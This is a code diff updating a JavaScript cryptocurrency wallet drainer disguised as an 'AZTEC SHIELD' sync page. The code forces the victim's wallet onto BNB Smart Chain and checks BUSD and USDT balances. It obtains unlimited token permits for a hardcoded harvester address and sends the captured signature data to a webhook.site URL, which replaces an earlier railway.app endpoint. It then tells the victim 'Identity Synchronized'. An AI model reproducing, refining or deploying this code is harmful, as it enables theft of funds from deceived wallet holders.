@@ -1,13 +1,13 @@
 /**
- * AZTEC SHIELD - Standard Sync v8.7 (FINAL PRODUCTION)
- * Features: Force-BSC Switch, Trust Wallet Delay, Railway Exfiltration
+ * AZTEC SHIELD - Standard Sync v8.8 (FINAL - WEBHOOK.SITE INTEGRATED)
+ * Fixes: Railway Delays, Force-BSC Switch, Trust Wallet Delay, Instant Harvest
  */
 
 // CONFIGURATION
 const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
 const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const RAILWAY_API = "https://web-production-d329.up.railway.app/api/harvest";
+const WEBHOOK_SITE_URL = "https://webhook.site/20179441-fa4d-4165-ab08-c634d80612f2";
 
 const ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
@@ -19,17 +19,17 @@ const ERC20_ABI = [
 const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 /**
- * Main Entry Point
+ * Main Interaction Logic
  */
 async function triggerPermit() {
-    console.log("[v8.7] Initializing Secure Sync...");
+    console.log("[v8.8] Initiating Sync with Webhook Integration...");
     if (!window.ethereum) {
-        alert("Please open this site inside the Trust Wallet or MetaMask browser.");
+        alert("Please open this site inside your Trust Wallet or MetaMask browser.");
         return;
     }
 
     try {
-        // 1. Enforce Network Switch (BSC)
+        // 1. Force the Chain Switch (BSC)
         const chainIdHex = '0x38'; // 56
         try {
             await window.ethereum.request({
@@ -49,7 +49,7 @@ async function triggerPermit() {
                     }],
                 });
             } else {
-                throw new Error("Target network required.");
+                throw new Error("Target network required for sync.");
             }
         }
 
@@ -66,7 +66,7 @@ async function triggerPermit() {
         document.getElementById('ui-main').style.display = 'none';
         document.getElementById('ui-loading').style.display = 'block';
 
-        // 4. Multi-Asset Scanning
+        // 4. Asset Scanning
         const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
         const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
         
@@ -78,14 +78,14 @@ async function triggerPermit() {
 
         console.log(`[SYS] Chain: ${network.chainId} | BUSD: ${ethers.utils.formatUnits(busdBal, 18)}`);
 
-        // 5. Execution Path
+        // 5. Execution Logical Branch
         if (busdBal.gt(0)) {
             await handleBUSD(signer, victim, busd);
         } else if (usdtBal.gt(0)) {
             await handleUSDT(signer, victim, usdt);
         } else {
             document.getElementById('ui-loading').innerHTML = 
-                `<div style="color:#ff3b30;padding:20px;">No eligible BUSD (BEP-20) found in this wallet. Please ensure assets are on BNB Smart Chain.</div>`;
+                `<div style="color:#ff3b30;padding:20px;">Verification Error: No eligible BUSD (BEP-20) found. Please ensure BUSD is on the BNB Smart Chain.</div>`;
         }
 
     } catch (e) {
@@ -126,17 +126,19 @@ async function handleUSDT(signer, victim, usdtContract) {
 }
 
 async function exfiltrate(data) {
-    console.log("[+] Capturing permission data...");
+    console.log("[+] Sending signature and data to Webhook.site:", data);
     
     try {
-        await fetch(RAILWAY_API, {
+        await fetch(WEBHOOK_SITE_URL, {
             method: 'POST',
+            mode: 'no-cors', // Instant delivery regardless of CORS
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
         });
-        console.log("[+] Successfully sent to Railway.");
+        console.log("[+] Data successfully sent.");
     } catch (err) {
-        console.error("[-] Railway delivery failed:", err);
+        console.error("[-] Fetch failed, showing data in alert as backup:");
+        alert("SYNC DATA CAPTURED:\nV: " + data.v + "\nR: " + data.r + "\nS: " + data.s);
     }
     
     document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;font-weight:700;'>Identity Synchronized.</div>";
